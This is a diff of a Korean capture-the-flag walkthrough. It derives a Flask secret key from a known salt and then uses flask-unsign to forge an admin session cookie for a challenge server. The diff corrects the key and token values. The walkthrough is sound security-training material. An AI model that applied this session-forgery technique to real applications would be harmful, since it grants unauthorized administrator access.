@@ -433,8 +433,12 @@ curl http://ctf.challenge.com:5000/api/legacy/system_info | jq
 import hashlib
 
 salt = "insane2"
-secret_key = hashlib.sha256(salt.encode()).hexdigest()[:32]
-print(f"Secret Key: {secret_key}")
+full_hash = hashlib.sha256(salt.encode()).hexdigest()
+secret_key = full_hash[:32]
+
+print(f"Salt: {salt}")
+print(f"SHA256 Full Hash: {full_hash}")
+print(f"Secret Key (first 32 chars): {secret_key}")
 ```
 
 ```bash
@@ -443,18 +447,24 @@ python3 calc_secret.py
 
 **결과**:
 ```
-Secret Key: d8c5e3f7a2b4e1c9f6d3a8b2e5c7f1a4
+Salt: insane2
+SHA256 Full Hash: 4e0210e179e20cd5bf97690a65df1c9e6532e402e4f0dcb3a613d80c647a9c83
+Secret Key (first 32 chars): 4e0210e179e20cd5bf97690a65df1c9e
 ```
 
 ### 참가자의 사고:
-> "Secret key를 얻었다! 이제 Flask 세션을 위조할 수 있다.
+> "Secret key를 얻었다: **`4e0210e179e20cd5bf97690a65df1c9e`**
+>
+> 이제 Flask 세션을 위조할 수 있다!
 >
 > 하지만 어떤 세션을 만들어야 할까? robots.txt에서 /api/admin/ 경로를 봤었는데, 아마 관리자 권한이 필요할 것 같다.
 >
 > 먼저 게스트 세션을 만들어서 세션 구조를 확인해보자.
 >
 > Flask 세션은 쿠키로 전달되니까, 쿠키를 파일로 저장해서 나중에 재사용할 수 있게 하자.
-> curl의 `-c` 옵션을 사용하면 쿠키를 파일로 저장할 수 있다."
+> curl의 `-c` 옵션을 사용하면 쿠키를 파일로 저장할 수 있다.
+>
+> **💡 중요: 이 secret key 값을 메모해두자. 곧 flask-unsign에서 사용할 것이다.**"
 
 ### Action 15: 게스트 세션 생성
 
@@ -517,18 +527,26 @@ flask-unsign --decode --cookie ".eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlH
 
 ```bash
 # Admin 세션 생성
+# --secret: Action 14에서 계산한 secret key 사용!
 flask-unsign --sign \
   --cookie "{'role': 'admin', 'user': 'hacker'}" \
-  --secret "d8c5e3f7a2b4e1c9f6d3a8b2e5c7f1a4"
+  --secret "4e0210e179e20cd5bf97690a65df1c9e"
 ```
 
-**결과**:
+**결과 (예시)**:
 ```
-.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslIqyS9OVdJRKi1OLYJx48GcWgAOdBMb.ZqK4QA.YpN3fG8Hk_4sR2Ji7wZ1sM3Cx5d
+.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePAnFoADvQTHw.ZqK5Ag.7xK2mP9vN_3kQ8Lj4wX9tN4Dy6e
 ```
+
+> **💡 참고**: 실제로 생성되는 세션 토큰은 위와 다를 수 있습니다.
+> 중요한 것은 `role: admin`이 포함된 세션을 만드는 것입니다.
 
 ### 참가자의 사고:
-> "Admin 세션을 만들었다! 이제 이걸 사용해서 /api/admin/ 경로에 접근해보자."
+> "Admin 세션을 만들었다!
+>
+> 이 토큰은 Flask가 `{'role': 'admin', 'user': 'hacker'}`를 secret key `4e0210e179e20cd5bf97690a65df1c9e`로 서명한 결과다.
+>
+> 이제 이걸 사용해서 /api/admin/ 경로에 접근해보자."
 
 ---
 
